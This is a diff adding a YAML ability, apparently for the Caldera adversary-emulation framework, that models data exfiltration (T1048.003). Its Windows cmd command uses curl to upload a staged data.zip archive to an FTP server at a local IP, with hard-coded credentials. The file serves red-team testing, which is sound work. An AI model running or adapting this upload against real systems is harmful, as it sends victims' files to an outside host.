@@ -1,0 +1,29 @@
+- name: Exfiltrates data using curl and ftp
+  description: this ability send data to Caldera's FTP using curl command
+  tactic: exfiltration
+  technique_id: T1048.003
+  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+  executors:
+  - payloads: []
+    platform: windows
+    name: cmd
+    cleanup: []
+    parsers: []
+    timeout: '180'
+    command: 'SET "Username = caldera_user";
+      SET "Password = caldera";
+      SET "Ftp = ftp://192.168.0.149";
+      SET "FtpPort = 2222";
+      SET "ArchiveName = data.zip";
+      SET "LocalStorageDir = exf";
+      SET "WholePathArchive = %PUBLIC%/%LocalStorageDir%/%ArchiveName%";
+      curl -T %WholePathArchive% -u "%Username%:%Password%" %Ftp%:%FtpPort%;'
+  repeatable: false
+  additional_info: {}
+  privilege: ''
+  singleton: true
+  buckets: []
+  requirements: []
+  access: {}
+  cleanup: []
+  id: curl_ftp_exfiltration_to_caldera_ftp_server
